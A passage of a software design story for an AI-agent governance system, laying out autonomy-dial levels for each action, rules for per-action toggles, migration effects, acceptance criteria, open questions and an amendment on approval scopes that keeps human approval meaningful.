| `automation:tenant-scheduled-trigger-service` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:tenant-status-invalidation-listener` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:workflow-seeder` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `automation:workflow-sync-service` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:engine.channel-outbox.enqueue` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:engine.document.persist` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:engine.document.set-status` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:schedule.create` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:schedule.delete` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:schedule.update` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `platform-task:billing.webhook.followup` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `platform-task:plan.activate_scheduled` | 70 | 30 | I1a · MutRev — writes inside the deployment; undone by an edit |
| `effect:engine.events.append` | 70 | 45 | I1a · MutIrrev — writes inside the deployment and cannot be un-written |
| `effect:engine.platform-events.append` | 70 | 45 | I1a · MutIrrev — writes inside the deployment and cannot be un-written |
| `platform-task:RETIRE_SECRET_VERSION` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `platform-task:billing.customer.create` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `platform-task:provisioning.tenant` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `platform-task:provisioning.tenant.v2` | 70 | 65 | I2 · MutRev — the effect is visible outside the deployment and can be undone there |
| `automation:outbox-slack-sender` | 70 | **75** | I2 · MutIrrev — the effect leaves the deployment and cannot be recalled |
| `automation:outbox-smtp-sender` | 70 | **75** | I2 · MutIrrev — the effect leaves the deployment and cannot be recalled |
| `platform-task:tenant.move` | 70 | **80** | I3 · MutRev — changes production/tenant configuration; re-settable |
| `automation:tenant-cleanup-requested-trigger` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |
| `automation:tenant-delete-requested-trigger` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |
| `platform-task:provisioning.tenant.deprovision` | 70 | **95** | I3 · Destructive — production or a whole tenant, irreversibly |

### M3 — The custom-toggle layer

**Nothing new is stored.** A per-action toggle is one `action_assignments` row.

| Concept | Storage | Where |
|---|---|---|
| The deployment's current level | `AcceptanceRules.AutonomyLevel` on the principal's base row | `AcceptanceRules.cs:44`-region; resolved by `IAcceptanceRulesResolver.ResolveBase*Async` (43-5 AC11) |
| A per-action toggle **on** | `action_assignments` row, `target_kind='action'`, `target_key='<ns>:<key>'`, `min_autonomy = <the current level>` | `ActionAssignment.cs:60-75`; written by `PUT /api/actions/policy/actions/{ns}/{key}/threshold` (`ActionPolicyEndpoints.cs:187-200`) |
| A per-action toggle **off** | DELETE the row → the ladder falls back to the shipped level | `ActionPolicyEndpoints.cs:246-271` (`DeleteAction`) |
| "Never run this at all" | `enabled = false` — a **different** field, writable at every level | `ActionAssignment.cs:82-84`; `PUT …/enabled` |
| The platform ceiling | platform-scope row (both principal keys null), composed by `max()` | `AutonomyGateEvaluator.cs:11-17` |

**The rules, which the API must enforce:**

1. **Level-owned** — an action whose shipped level is `≤` the principal's current dial. The level owns it. `PUT …/threshold` on a level-owned action returns **409 `ACTION_POLICY.LEVEL_OWNED`**, naming the level and the dial. It cannot be individually switched off, because switching it off is what raising the dial is *for*, in reverse.
2. **Above the level** — an action whose shipped level is `>` the dial. `PUT …/threshold` is permitted, and the **only legal value is the caller's current dial** (turn this one on now) — any other value is 400. That is what makes the surface a toggle rather than a second, hidden dial. `DELETE` removes it.
3. **`enabled` is orthogonal and always writable.** "This deployment never sends email" is a real requirement at every level and is not a level question.
4. **The platform ceiling still wins.** The ladder composes by `max()` (`AutonomyGateEvaluator.cs:11-17`, F10: "adding a row on either plane can only make the resolution more restrictive"), so a ceiling row of 95 on `effect:deploy.promote-prod` holds it shut even for a tenant admin who toggled it on. **A toggle is never an escalation of privilege.**
5. **Group-scope rows are unchanged**, and are the admin's power tool for bulk work. Rule 1 applies to `action`-scope rows only — see **OQ6**.

### M4 — The UI rule

Lands in `packages/dashboard`, on the page Story 43-7 specifies (`/admin/actions`, `ActionCatalogAdminPage`, `GroupedTable` + `DimmedRow`).

| Row state | Render |
|---|---|
| **At or below the current level** | Dimmed (`DimmedRow`, `aria-disabled="true"`), the control **disabled** (`RowToggle` `disabled` → `opacity-50 cursor-not-allowed`), and the **reason visible**: `"Automated at level N — owned by the dial (currently L)"`. |
| **Above the current level** | Normal, with an enabled toggle. On: writes `min_autonomy = L`. Off: DELETE. A badge shows `"On at L — would automate anyway at N"` when a row exists. |

**What the API must return for that to be renderable** — `GET /api/actions/policy?level=NN` (`ActionPolicyEndpoints.cs:98-181`) already returns `minAutonomy`, `source`, `enforce`, `enabled`, `automatedAtLevel` (`:144`) and `enforcementSites` (`:154`). It must additionally return, and change:

- `shippedLevel` — the descriptor's `DefaultMinAutonomy`, so the UI can say *why* a row is dimmed without a second lookup against `/catalog`.
- `levelOwned` — `shippedLevel <= viewLevel`, computed with the same comparison the gate uses.
- `editable` — **`!levelOwned`**, replacing the unconditional `editable = true` at `ActionPolicyEndpoints.cs:148` and its S3 comment.
- `reason` — the human string the dimmed row shows, server-authored so the UI does not restate policy.

The `LevelPreviewControl` (43-7 AC8) stays display-only and must **not** change `editable`: previewing a level shows what *would* be owned there, and Story 43-7's `dimmed_rows_recompute_on_slider_move_without_refetch` still holds because `levelOwned` is recomputable client-side from `shippedLevel` and the preview level.

### M5 — The migration

**Summary: 22 actions move up, 175 move down, 0 stay.**

#### Moving ABOVE 70 — 22 actions, each newly gated at the shipped default dial

`AcceptanceDefaults.DefaultAutonomyLevel` stays **70** (`AcceptanceDefaults.cs:33`), so on a fresh install and on every upgrade that has not raised its dial, each of these needs a person (or, for `automation:*`, is denied) where it previously ran.

**9 are enforced by a live seam — these are the real breakages:**

| Action | New | Seam | Site | Effect at dial 70 |
|---|---|---|---|---|
| `tool:shell_execute` | 80 | B | `InlineToolLoopRunner.cs` tool loop | **Every agent shell call suspends for a person.** The highest-impact single row in this story. |
| `effect:agent-dispatch.run` | 80 | C | `Program.cs:3484` | External agent runs suspend. |
| `effect:git.pull-request.merge` | 75 | C | `Program.cs:3413` | Autonomous merge suspends. |
| `effect:git.branch.delete` | 90 | C | `Program.cs:3438` | Branch cleanup suspends. |
| `effect:notify.slack.queue` | 75 | C | `Program.cs:3509` | Slack notifications suspend. |
| `effect:notify.email.send` | 75 | C | `Program.cs:3520` | Email suspends. |
| `automation:outbox-slack-sender` | 75 | D | `OutboxSlackSender.cs:133` | **Denied**, not escalated (Seam D is deny-only) — queued Slack never drains. |
| `automation:outbox-smtp-sender` | 75 | D | `OutboxSmtpSender.cs:153` | **Denied** — queued email never drains. |
| `effect:deploy.promote-prod` | 95 | E | `DeploymentPipelineWorkflow.cs:274` | Production promotion suspends. Note the existing business-mode gate (`:243`) already does this for one arm; the autonomy gate joins by `OR`, so this widens it to every arm. |

**13 have no enforcement site today — declarative only, but they become live the day their seam lands:**

`agent-action:deploy` (95), `agent-action:rollback` (95), `agent-action:configure-cicd` (80), `effect:deploy.rollback` (95), `effect:process.spawn` (80), `effect:mentorship.session.start` (80), `effect:mentorship.session.cancel` (90), `effect:tracker.project.delete` (75), `effect:tracker.work-item.delete` (75), `automation:tenant-cleanup-requested-trigger` (95), `automation:tenant-delete-requested-trigger` (95), `platform-task:tenant.move` (80), `platform-task:provisioning.tenant.deprovision` (95).

**Every one of the 22 needs a recorded decision — `ACCEPT` (the gate is intended; the deployment raises its dial) or `REBASE` (the level is lowered to `≤` the shipped default, with the reason).** AC9 makes "undecided" a build failure. `tool:shell_execute` is the one most likely to be rebased, and it is also the one whose derivation is strongest — see **OQ1**.

#### Moving BELOW 70 — 175 actions

**171 of them change nothing on any dial reachable today.** Their current threshold is 70 and their new level is `≤ 70`, so across the entire currently-legal range `[70,100]` they are automated before and after. They become meaningful only once a deployment lowers its dial — which is the capability this story adds.

**4 do change behaviour, in the loosening direction** — the ex-`AlwaysHuman` set, which was automated at *no* dial position and now becomes automated at a real one:

| Action | Now | New | Newly automated when the dial is |
|---|---|---|---|
| `document-type:design` | 101 | 80 | ≥ 80 |
| `effect:mcp.tool.invoke` | 101 | 80 | ≥ 80 |
| `document-type:sprint-plan` | 101 | 85 | ≥ 85 |
| `document-type:threat-model` | 101 | 90 | ≥ 90 |

At the shipped default dial of 70 **all four remain gated**, so no upgrade loosens anything on day one. The 2026-07-30 MCP governance decision (`README.md:548`, `ActionCatalogDefaultsTests.cs:44-69`) survives in substance — MCP still needs a person at every dial position a deployment ships with — but it stops being unconditional, which is required by "at 100 everything is automated".

#### What does NOT move

- **No new or removed actions.** `ActionVocabularyCountTests.cs:132-149`'s `197` pin is untouched, and AC10 asserts it.
- **No SQL.** 43-5 deliberately left no numeric CHECK on `min_autonomy` (`20260729070256_AddActionGovernance.cs:32-33`), which is exactly the foresight this story cashes in.
- **`AcceptanceDefaults.DefaultAutonomyLevel` stays 70** (`AcceptanceDefaults.cs:33`); `AcceptanceDefaultsDriftTests.cs:23,148,181` are untouched. It stops being incidentally equal to `AutonomyDial.Min` and becomes a real, separate default — which is what `43-1-autonomy-dial-one-constant.md:81` already argued it was.
- **`agent-action:triage-intake`'s effective threshold does not move at all.** Its catalog level goes 70 → 10, but `TriageBindingHelper` ships a live `EscalationClass(AgentAction, TriageIntake)` and the evaluator composes that legacy always-escalate floor by `max()` (`AutonomyGateEvaluator.cs:301-307`), so it still resolves to `AlwaysHuman` at every dial position until the entry is deleted in the acceptance-rules UI. This is 43-3 D7 working as designed and is the reason the catalog default must not duplicate the floor. `ActionCatalogDefaultsTests.cs:168-178` (`TriageIntake_ShipsAtMin_FloorComesFromAlwaysEscalate`) is renamed and re-pinned to 10, keeping its reasoning comment.

### M6 — The 101 sentinel

**`AutonomyDial.AlwaysHuman` (`AutonomyDial.cs:38`) is NOT deleted.** It has 129 test references across 17 files and three live, distinct jobs that the 1–100 model does not remove:

1. `ActionCatalog.UnclassifiedFallback` (`ActionCatalog.cs:49`) — the threshold for a key that reaches the gate with no catalog entry (epic D2).
2. The fail-closed substitution for a degraded policy read (`AutonomyGateEvaluator.cs:286,530`, F6).
3. The legacy always-escalate floor (`AutonomyGateEvaluator.cs:301-307`) and a stored admin threshold meaning "off".

**What changes is that no shipped descriptor may carry it.** The four that do come onto real levels:

| Action | Site | 101 → | Why |
|---|---|---|---|
| `document-type:design` | `Descriptors.cs:241` | **80** | O2: it ships `AcceptorRequirement.Human` today; a design is what everything is built against. |
| `document-type:sprint-plan` | `Descriptors.cs:253` | **85** | O2: a capacity commitment is a commitment made to people outside the system. |
| `document-type:threat-model` | `Descriptors.cs:255` | **90** | O2: unmitigated high-risk escalation is a security-owned call. |
| `effect:mcp.tool.invoke` | `Descriptors.cs:388` | **80** | I2 · Command — unbounded reach outside the deployment, and (the 2026-07-30 reason) no CI harness can enumerate a remote server's tools. |

**The matching change in `AcceptanceDefaults`, or the two surfaces disagree.** `AcceptanceDefaults.For` returns an `AcceptorRequirement.Human` row for exactly `design`, `sprint-plan`, `threat-model` (`AcceptanceDefaults.cs:122,146,170`, switch at `:206-223`). That says **a person accepts, at every dial position** — which is precisely `AlwaysHuman` expressed in a second vocabulary, and it is why `ActionCatalogDefaultsTests.cs:93-120` exists to keep them in lockstep. Leave it alone and the catalog says "design acceptance is automated at 80" while the resolver hands the decision to a person at 100.

The resolution: **`AcceptorRequirement` stops being a per-type shipped constant and becomes a function of the dial** — `Human` while `dial < catalogLevel(document-type:<type>)`, `Any` at or above it. Concretely:

- `AcceptanceDefaults.cs:120-124,144-148,162-172` — the three `s_human*` rows lose their hardcoded `AcceptorRequirement.Human`.
- `AcceptanceFloors.ShippedFloorFor` (`AcceptanceFloors.cs:69-70`) reads the catalog level and the resolved dial instead of the static default. The `max()` lattice (`AcceptanceFloors.cs:65`) is unchanged; only its input moves. The CD-1 protection is preserved: a base `PUT` still cannot lower the floor below what the level implies.
- `ActionCatalogDefaultsTests.cs:93-120` is rewritten to assert the *derivation* (`AcceptorRequirement.Human` at dial `L` ⟺ `L < ActionCatalog.Get(document-type:<type>).DefaultMinAutonomy`) rather than the constant.
- `AcceptanceRulesEndpointsTests.Upsert_explicit_any_clears_the_human_floor` and `AcceptanceFloorsTests` are re-vectored onto the derived floor.

**Acceptance is still always a workflow step.** Nothing here removes the acceptance decision from the document lifecycle; the level chooses *who* answers it — orchestrator, a single reviewer, or the 7-role panel (`AcceptanceDefaults.cs:206-223`, `ReviewerSelection`). There is no self-accept and this story does not create one. The two runtime signals that pull in a person **regardless of level** are untouched and remain the only things that do so at 100: ambiguity at or above the threshold (`DocumentLifecycleHelper.cs:363-374`, `AcceptanceEscalationReason.AmbiguityAboveThreshold` at `AcceptanceDecision.cs:55`) and a review that does not resolve (`AcceptanceEscalationReason.BlockingReviewViolation`, `AcceptanceDecision.cs:54`).

---

## Acceptance Criteria

1. **The dial spans 1–100, in one edit.** `apps/tamma-elsa/src/Tamma.Core/Documents/Policy/AutonomyDial.cs:27` becomes `public const int Min = 1;` and **nothing else in production C#, SQL or TypeScript gains a bound** (43-1 AC12, inherited). `AutonomyDialTests.cs:32-39,52-62` pass unchanged because they derive from the constant; a new `Min_is_below_the_shipped_default` asserts `AutonomyDial.Min < AcceptanceDefaults.DefaultAutonomyLevel`, so the two concepts can never re-fuse.

2. **`AcceptanceRules.cs:85-86` stops restating the bound** (Story 43-1 AC2, which has not landed and without which `Min = 1` has no effect on any stored rule): the literal `is < 70 or > 100` becomes `!AutonomyDial.IsValidLevel(AutonomyLevel)` with an interpolated message. `AcceptanceRulesModelTests.cs:22-28` becomes a `[TestCaseSource]` over `(Min-1,false) (Min,true) (Max,true) (Max+1,false)` and is renamed off `_70_to_100`.

3. **No catalogued action is left at a default.** All six descriptor helpers (`ActionCatalog.Descriptors.cs:38-76`) take a **required, non-defaulted** `level` parameter — the three that hardcode `AutonomyDial.Min` (`:53`, `:69`, `:75`) gain one, the three with `int min = AutonomyDial.Min` (`:40`, `:45`, `:58`) lose the default. **A new action therefore cannot compile without a level**, which is the only guard that actually holds; a test can prove a value exists but never that it was chosen. `ActionCatalogDefaultsTests.cs:83-91`'s `EveryOtherMember_DefaultsToMin` is **deleted** (its assertion is now false by design) and replaced by `NoActionSitsAtTheOldUniformDefault`: the catalog uses **at least 10 distinct** `DefaultMinAutonomy` values and **no single value covers more than 40%** of it (the largest bucket under M2 is level 30 at 52/197 ≈ 26%; today's uniform 70 is 193/197 ≈ 98%) — a coarse guard that fails loudly if someone reverts the table toward one value while leaving the required parameter in place. The real pin is AC4.

4. **The level table ships verbatim as M2, and is pinned.** `ActionCatalogLevelTests.EveryActionHasItsAssignedLevel` carries the 197-row `(actionKey → level)` table as an explicit array and compares it to `ActionCatalog.All`, with a symmetric-difference failure message naming every missing, extra and mismatched key. Changing a level is then a two-file, reviewed diff.

5. **The dial demonstrably does something — the strict-subset property.** `AutonomyDialTests.RaisingTheDialAutomatesStrictlyMore`:
   - `Automated(70)` ⊊ `Automated(100)` — a **strict** subset (`Should().BeProperSubsetOf`), where `Automated(L) = { d ∈ ActionCatalog.All : L >= d.DefaultMinAutonomy }`;
   - `Automated(1)` is **empty** and `Automated(100)` is the **whole catalog**;
   - `Automated(L) ⊆ Automated(L+1)` for every `L ∈ AutonomyDial.ValidLevels()` (monotonicity, so no level can ever automate *less*);
   - the number of levels at which the set strictly grows is **≥ 10** — a coarse anti-regression guard that fails if someone collapses the table back toward one value.

6. **No shipped descriptor carries `AlwaysHuman`.** `ActionCatalogDefaultsTests.ShippedDefaults_ReproduceTodaysGatingBehaviour` (`:72-81`) inverts: the `AlwaysHuman` set over `ActionCatalog.All` is **empty**, and `ActionCatalog.All.Should().OnlyContain(d => AutonomyDial.IsValidLevel(d.DefaultMinAutonomy))` — a *level*, not merely a valid *threshold*. `ShippedAlwaysHuman` (`:29-70`) is deleted; `UnclassifiedFallback_is_AlwaysHuman` (`:189-193`) is **kept unchanged** and gains a comment stating that the sentinel survives for the three jobs in M6.

7. **The four ex-sentinels and the acceptance rules agree.** `AcceptanceDefaults.cs:122,146,170` lose their hardcoded `AcceptorRequirement.Human`; `AcceptanceFloors.ShippedFloorFor` derives the floor from `ActionCatalog.Get(new ActionKey(DocumentType, type.ToWire())).DefaultMinAutonomy` and the resolved dial. `ActionCatalogDefaultsTests.cs:93-120` is rewritten to assert the biconditional in M6 over **every** `DocumentTypeKey` at **every** `AutonomyDial.ValidLevels()` position. `AcceptanceFloorsTests` and `AcceptanceRulesEndpointsTests.Upsert_explicit_any_clears_the_human_floor` are re-vectored, not deleted — the CD-1 protection must still fire.

8. **Level ownership is enforced server-side.** `PUT /api/actions/policy/actions/{ns}/{key}/threshold`:
   - returns **409 `ACTION_POLICY.LEVEL_OWNED`** when `shippedLevel <= currentDial`, naming both numbers;
   - returns **400** when `shippedLevel > currentDial` and the body's `minAutonomy != currentDial`;
   - accepts `minAutonomy == currentDial` and writes one `action`-scope row.
   `PUT …/enabled` is unaffected at every level. Tests: `LevelOwnedAction_Rejects409`, `AboveLevelAction_AcceptsOnlyTheCurrentDial`, `Enabled_IsWritableEvenWhenLevelOwned`, `Toggle_IsStillHeldByThePlatformCeiling`.

9. **Every action moving above the shipped default dial has a recorded decision.** A test-resident table lists all 22 with `ACCEPT` or `REBASE` and a one-line reason; `NoUpwardMoveIsUndecided` cross-checks it against `ActionCatalog.All` (every action whose level exceeds `AcceptanceDefaults.DefaultAutonomyLevel` must appear; an entry naming an action that no longer moves up is **stale and fails**, the `ContractBindingTests` ratchet). A second test, `LiveEnforcedUpwardMoves_AreNamed`, pins the 9-row live-seam subset of M5 so the count cannot drift silently as seams land.

10. **Nothing is added to or removed from the catalog.** `ActionVocabularyCountTests.cs:132-149` (`197`) and `ActionEnforcementSitesTests.cs:159-176` (`21` bound rows) pass **unmodified**. If either needs editing, the story has done something it was not asked to do.

11. **Mid-range levels are legal on non-escalatable members.** `ActionPolicyEndpoints.cs:600-625` and `:569-598` stop rejecting a mid-range threshold on an `automation:*` target; the deny-only semantics are preserved by *wording*, not by *refusal* — the API response and the UI control both say **"denied below level N"**, never "human below level N". `ActionDescriptorMetadataTests.cs:44-53`'s comment ("*the 43-6 API will reject mid-range thresholds*") is corrected; the escalatability assertion itself stays. Tests: `AutomationTarget_AcceptsAMidRangeLevel`, `AutomationTarget_BelowLevel_IsDeniedNotEscalated`.

12. **The policy view carries what the UI needs.** `GET /api/actions/policy?level=NN` adds `shippedLevel`, `levelOwned` and `reason`, and `editable` becomes `!levelOwned` — replacing `ActionPolicyEndpoints.cs:148` and its S3 comment. `levelOwned` is computed with the same comparison the gate applies, so the greying rule cannot drift from the enforcement rule. Test: `PolicyView_MarksLevelOwnedRowsNonEditable`.

13. **The UI dims and locks, and says why.** In `packages/dashboard`: a level-owned row renders through `DimmedRow` with `aria-disabled="true"`, its control **disabled**, and the server's `reason` string visible. An above-level row renders an enabled `RowToggle`. Story 43-7's `keeps_threshold_control_editable_on_greyed_row` (`43-7-admin-ui.md:184`, contract at `:115-117`, primitive at `:146-149`) is **replaced** by `level_owned_rows_are_not_editable_and_show_the_reason`; `renders_every_catalog_member_at_every_level` is kept. `RulesEditDialog.tsx:35-36,183,188-189` lose `MIN_AUTONOMY`/`MAX_AUTONOMY` and bind to `GET /api/actions/dial`; `AcceptanceRulesAdminPage.test.tsx:116-123` (`expect(slider.min).toBe('70')`) sources both bounds from the mocked payload.

14. **The three silent coverage loops are re-derived** (Story 43-1 AC6/AC7, unlanded and now load-bearing): `AcceptanceContractTests.cs:98`'s `for (var level = 70; level <= 100; level++)` → `foreach (var level in AutonomyDial.ValidLevels())`; `AcceptanceGuardrailsTests.cs:186`'s `rng.Next(70, 101)` → `rng.Next(AutonomyDial.Min, AutonomyDial.Max + 1)`; `AcceptanceRulesServiceTests.cs:104-117`'s corrupt-row vector `AutonomyLevel = 5` → `AutonomyDial.Max + 1000` **with the comment explaining that 5 is legal once the range widens**. Without AC14 the entire new band 1–69 ships unexercised and the corrupt-row test silently stops testing.

15. **The docs that assert the old model are corrected.** `docs/stories/epic-43/README.md:549` (D3) records that the widen happened here; `story-43-1/43-1-autonomy-dial-one-constant.md:131` (Out of Scope: "`Min` stays `70`") gains a pointer to this story; `story-43-3/43-3-groups-and-behaviour-preserving-defaults.md`'s AlwaysHuman derivation and `story-43-6/43-6-admin-api-and-rbac.md` AC7's mid-range clause and `story-43-7/43-7-admin-ui.md`'s greyed-row contract are each amended, not silently contradicted.

16. **`dotnet test` is green and `dotnet ef migrations has-pending-model-changes` is clean** — the latter trivially, because no schema changes (M5).

## Dependencies

- **Story 43-1 (`AutonomyDial`)** — **blocking, and partly unlanded.** AC1 (the constant) shipped; AC2 (the `AcceptanceRules.cs:85-86` rewire), AC4/AC5 (the dashboard unhardcode), AC6/AC7/AC8 (the corrupt-row vector and the two silent loops) have **not**. This story's AC2 and AC14 land them, because `Min = 1` is inert without them.
- **Story 43-2 / 43-3** — `ActionDescriptor`, `ActionGroup`, `ActionRisk`, `Reversible` and the 197-row descriptor table are the entire input to M1. Landed.
- **Story 43-5** — `action_assignments`, `AutonomyGateEvaluator`'s `max()`/`??` ladder, and the snapshot store are the custom-toggle layer. Landed; **not extended**.
- **Story 43-6** — `ActionPolicyEndpoints` is where AC8/AC11/AC12 land. Landed (the story doc still says "drafted"; the code is in `src/Tamma.Api/Endpoints/ActionPolicyEndpoints.cs`).
- **Story 43-7 (Admin UI)** — **this story overturns its greyed-row contract** (`:117-119`, AC5, AC12). If 43-7 has not been built, fold AC13 into it; if it has, AC13 is a change to it. Coordinate before either is scheduled.
- **Story 43-9 (seams)** — determines which of M5's 22 upward moves are live. Seams B/C/D/E are partly landed; every seam that lands afterwards converts declarative rows into real gates, which is why AC9's decision table is a permanent artifact rather than a one-off.
- **Existing, verified:** `AutonomyDial.cs:27,30,38,41,48,52`; `ActionCatalog.Descriptors.cs:38-76,241,253,255,388`; `ActionCatalog.cs:49,182`; `ActionDescriptor.cs:15,18-26`; `ActionGroup.cs:41-87`; `ActionRisk.cs:20-29`; `AcceptanceDefaults.cs:33,122,146,170,206-223`; `AcceptanceFloors.cs:65,69-70,80-85`; `AcceptanceRules.cs:85-86`; `AcceptanceDecision.cs:50-58`; `DocumentLifecycleHelper.cs:363-374`; `ActionAssignment.cs:52-88`; `AutonomyGateEvaluator.cs:11-17,286,301-307,530`; `ActionPolicyEndpoints.cs:98-181,187-200,569-625`; `20260729070256_AddActionGovernance.cs:32-33`; `Program.cs:3158-3192,3403-3520`; `ActionCatalogDefaultsTests.cs`; `ActionVocabularyCountTests.cs:132-149`; `ActionDescriptorMetadataTests.cs:44-53,90-96`; `ActionEnforcementSitesTests.cs:159-176`.

## Out of Scope

- **Adding, removing, renaming or regrouping any action.** The 197-member catalog and the 16-group partition are inputs. `ActionGroup` wires are persisted vocabulary (`ActionGroup.cs:32-36`); changing one is a migration and a different story.
- **Deleting `AutonomyDial.AlwaysHuman`.** It keeps three live jobs (M6). Only its use as a *shipped descriptor default* ends.
- **Changing `AcceptanceDefaults.DefaultAutonomyLevel`.** It stays 70. Whether a deployment should ship at a higher dial is AC9's decision, not a constant change here.
- **Per-server / per-tool MCP catalog members.** `effect:mcp.tool.invoke` stays one coarse member (`ActionGroup.cs:149-154`); giving it granularity is epic open question 1.
- **New enforcement seams.** Story 43-9. This story assigns levels; it does not widen what reads them.
- **A platform-ceiling write path.** Still out of scope per 43-6 (`43-6-admin-api-and-rbac.md:216-218`); the ceiling is honoured by AC8's test, not authored.
- **The `mode`-scope assignment row** (`ActionAssignment.cs:60-62`). Untouched.
- **Two-person approval for a toggle.** No such mechanism exists anywhere in the repo (43-6 Out of Scope).

## Open Questions

**OQ1 — `tool:shell_execute` at 80, and `effect:process.spawn` at 80.** The derivation is strong: `command-execution` is I2 because its own group description says it "can reach any governed HTTP route by curl and can perform any git operation directly" (`ActionGroup.cs:127-130`), and it is `Command` + irreversible. But it is also the tool loop's workhorse, it is enforced live at Seam B, and at the shipped dial of 70 this single row suspends every agent shell call. **This is the assignment most likely to be overruled, and it is a product decision, not a derivation error.** Either the level is right and a working autonomous deployment runs at ≥ 80, or the shipped dial rises, or `shell_execute` is rebased to 70 and the group description's bypass disclosure becomes the only protection. AC9 forces the choice to be written down; it does not make it.

**OQ2 — irreversible-but-harmless internal writes sit at 45.** `effect:engine.events.append`, `effect:engine.platform-events.append`, `effect:llm.call` and `effect:engine.channel-outbox.enqueue` are marked `reversible: false` because you cannot un-append a row — not because the consequence is hard to undo. The rule mechanically lifts them from 30 to 45. Below 70 either way, so nothing changes today, but the rule is arguably measuring the wrong thing here. Candidate refinement: split `Reversible` into "the state can be restored" vs. "the record is append-only". **Not done here** — it is a descriptor-model change and would touch 43-2.

**OQ3 — the queue/send split levels inconsistently.** `effect:notify.email.send` (the enqueue route, `external-comms`) lands at 75; `automation:outbox-smtp-sender` (the thing that actually reaches SMTP) lands at 75 only because M1 hand-lists it into I2 — its `ActionGroup` is `platform-automation`, which would otherwise put it at 45. The gate that matters is the enqueue, so the outcome is right, but it is right by an exception rather than by the group partition. Either `outbox-*-sender` belongs in `external-comms` (a 43-3 regroup, and a persisted-vocabulary change) or M1's I2 hand-list is permanent. **Recorded, not resolved.**

**OQ4 — the ordering of design (80) / sprint-plan (85) / threat-model (90) is a product judgement.** The derivation says only "these three ship a human acceptor"; it does not rank them. The proposed order reads them as increasing distance from something the system can put right by itself. A single flat 85 for all three is equally defensible and simpler to explain. **Needs a product answer.**

**OQ5 — is a `document-type` acceptance really at the level of the document, or of the work it releases?** M1 puts every non-panel acceptance at 55 and every panel acceptance at 60. But accepting a `plan` releases implementation work that may itself sit at 45, while accepting a `findings` releases nothing. A defensible alternative is "an acceptance sits at the level of the highest-level action it unblocks", which would spread the 17 document types across 45–80 instead of clustering them at 55/60. That needs a producer→document→consumer map that does not exist in the tree today.

**OQ6 — group-scope rows and level ownership.** M3 rule 1 forbids a per-*action* row on a level-owned action. It says nothing about a *group* row, so an admin can still lower a whole group below the dial and re-open level-owned members that way. Closing it means either forbidding group rows that touch level-owned members (restrictive, and group rows are the bulk tool) or accepting that groups are the documented escape hatch. **Recorded as a deliberate gap in v1.**

**OQ7 — `effect:secret.reveal` gets level 20 and it will never be enforced.** It is the catalog's only `Enforceable = false` member (`ActionDescriptorMetadataTests.cs:62-75`; epic OQ2, answered 2026-07-25). Giving it a level is required by "every action has a level" and is harmless, but the UI must not render it as governed. AC12's `enforceable` field already carries the fact; whether the row should be dimmed *differently* from a level-owned row is a UI question this story does not answer.

**OQ8 — `platform-task:RETIRE_SECRET_VERSION` is hand-listed into I2.** The `Task` helper hardcodes `ActionGroup.PlatformAutomation` for all eight platform tasks (`ActionCatalog.Descriptors.cs:71-75`), so the secret-handling one cannot express "the subject dominates the verb" (43-3 D5.4) the way `agent-action:audit-secrets` does. Same shape as OQ3: right answer, reached by exception. A `group` parameter on `Task()` would fix it and is a 43-3 change.

## Estimated Effort

5 days — 2 for the assignment table and its review (that is the story; the code is small), 1 for the descriptor + `AutonomyDial` + `AcceptanceDefaults`/`AcceptanceFloors` edits, 1 for the API and its tests, 1 for the test re-vectoring in AC14 and the dashboard.

## Change Log

| Date       | Version | Changes                | Author |
| ---------- | ------- | ---------------------- | ------ |
| 2026-08-01 | 1.0.0   | Initial story creation | Claude |

---

## Amendment 2 — 2026-08-01: the depth pass (six verified investigations)

Six read-only investigations were run against the tree before implementation
(telemetry/frequency, runtime-signal coverage, chain coherence, argument
grading, toggle semantics, acceptance unification). Everything below is
grounded in their file:line-verified findings; the design judgements are the
coordinator's. **This amendment supersedes OQ1 and narrows OQ6; the rest of
the story stands.**

### A. A level is not enough — approval has a SCOPE axis

A level says *when* an action stops needing a person. It does not say *what
one approval covers*. Without the second axis, `tool:shell_execute` above the
dial means one human interruption **per tool call** — and the tool loop runs
up to `MaxSteps = 20` turns with multiple calls per turn
(`LlmCallModels.cs:482`), across many LLM sub-workflows per issue-run. A
human asked tens of times per run stops reading; rubber-stamping degrades
exactly the gates that matter.

Four approval scopes, ordered; the first two exist, the third is a small
ledger extension, the fourth is the ledger as built:

| Scope | Meaning | Exists? |
|---|---|---|
| **Level** (platform standing) | automated because level ≤ dial | yes — the resolver |
| **Toggle** (tenant standing) | automated because the admin switched it on | yes — an assignment row (encoding fixed in E below) |
| **Correlation grant** (one run) | a person approved THIS run using it | **partial** — `action_authorizations` is keyed by (principal, correlation, target) but a grant is consumed ONCE (`ConsumedAtUtc`, single CAS consume); a second ask in the same correlation re-blocks. Needs a `Scope` on the grant: `single-use` \| `correlation-standing`. |
| **Call grant** (one click, one call) | the per-ask decide flow | yes — 43-9 AC13 |

**The anti-rubber-stamp rule:** per-call human approval is reserved for
actions that fire rarely (once per run or less). Anything that fires
per-iteration MUST be coverable by a correlation-standing grant asked ONCE at
run entry — "this run may use the shell" — or its gating is theatre.
Frequency classes were verified per action: `shell_execute` =
per-tool-loop-iteration; `agent-dispatch.run` = per-task;
`pull-request.merge`, `deploy.promote-prod` = once per issue-run.

### B. The worst interaction found: two approval systems that do not speak

At the shipped dial 70 with merge at 75, the human approves the merge in
`MergeApprovalWorkflow` — and then Seam C **409s the actual merge API call**,
because workflow approvals and ledger grants are disjoint systems. The
person said yes and the system blocks anyway, on the main path of every
issue-run.

